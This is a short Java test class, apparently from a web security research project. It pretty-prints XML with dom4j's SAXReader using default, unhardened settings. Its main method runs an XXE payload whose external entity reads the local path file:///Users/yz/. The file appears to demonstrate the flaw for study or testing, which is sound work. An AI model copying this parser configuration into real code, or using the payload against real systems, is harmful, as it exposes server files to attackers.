package cn.org.javaweb.test.action;

import org.dom4j.Document;
import org.dom4j.io.OutputFormat;
import org.dom4j.io.SAXReader;
import org.dom4j.io.XMLWriter;

import java.io.StringReader;
import java.io.StringWriter;

public class XmlFormat {

	public static void format(String str) throws Exception {
		SAXReader    reader   = new SAXReader();
		StringReader in       = new StringReader(str);
		Document     doc      = reader.read(in);
		OutputFormat formater = OutputFormat.createPrettyPrint();
		formater.setEncoding("utf-8");
		StringWriter out    = new StringWriter();
		XMLWriter    writer = new XMLWriter(out, formater);
		writer.write(doc);
		writer.close();
		System.out.println(out.toString());
	}

	public static void main(String[] args) throws Exception {
		String str = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE test [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM \"file:///Users/yz/\" >]><root><name>&xxe;</name></root>";
		format(str);
	}
}